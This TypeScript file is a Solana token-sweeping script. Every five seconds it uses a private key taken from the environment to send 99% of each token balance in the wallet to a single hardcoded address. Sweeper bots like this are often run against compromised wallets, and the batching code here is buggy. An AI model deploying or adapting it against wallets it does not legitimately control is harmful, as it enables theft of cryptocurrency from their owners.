import {
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
  getOrCreateAssociatedTokenAccount,
  getMint,
  createTransferCheckedInstruction,
} from "@solana/spl-token";
import bs58 from 'bs58'
import {
  Connection,
  Keypair,
  PublicKey,
  sendAndConfirmTransaction,
  Transaction,
} from "@solana/web3.js";
let jaregm = new PublicKey("94NZ1rQsvqHyZu1B71KwVT9B6sWm4h2Q1f6d6aXoJ6vB");
// @ts-ignore
let ALT_RPC_LIST = process.env.ALT_RPC_LIST
// @ts-ignore

let ran = Math.floor(Math.random() * ALT_RPC_LIST?.split(",").length);

const payer = Keypair.fromSecretKey(
  new Uint8Array(
    bs58.decode(
      // @ts-ignore
      process.env.SOLANA_WALLET_PRIVATE_KEY
    )
  )
);
// @ts-ignore
var connection2 = new Connection(ALT_RPC_LIST.split(",")[ran]);

async function doit() {
  try {
    let arg2 = (
      await connection2.getParsedTokenAccountsByOwner(payer.publicKey, {
        programId: TOKEN_PROGRAM_ID,
      })
    ).value;
    let a = 0;
    let instructions: any = [];
    for (var ata of arg2) {
      let mint = new PublicKey(ata.account.data.parsed.info.mint);

      let myshit = parseFloat(ata.account.data.parsed.info.tokenAmount.amount) / 10000 * 9900;
      if (myshit > 1000) {
        a++;
        if (a <= 2) {
          const associatedDestinationTokenAddr =
            await getOrCreateAssociatedTokenAccount(
              connection2,
              payer,
              mint,
              jaregm,
              true
            );

          instructions.push(
            createTransferCheckedInstruction(
              ata.pubkey, // from (should be a token account)
              mint, // mint
              associatedDestinationTokenAddr.address,
              // to (should be a token account)
              payer.publicKey, // from's owner
              Math.floor(myshit), // amount, if your deciamls is 8, send 10^8 for 1 token
              ata.account.data.parsed.info.tokenAmount.decimals
            )
          );
          // }
        } else {
          let tx = new Transaction().add(...instructions);
          tx.recentBlockhash = await connection2
            .getLatestBlockhash()
            .then((res) => res.blockhash);
          let result =  await connection2.sendTransaction(tx, [payer], {
            skipPreflight: false,
          });
          console.log(result);
          a = 0;
        }
      }
    }
  } catch (err) {
    console.log(err);
  }
}
doit();
setInterval(async function () {
await  doit();
}, 5000);
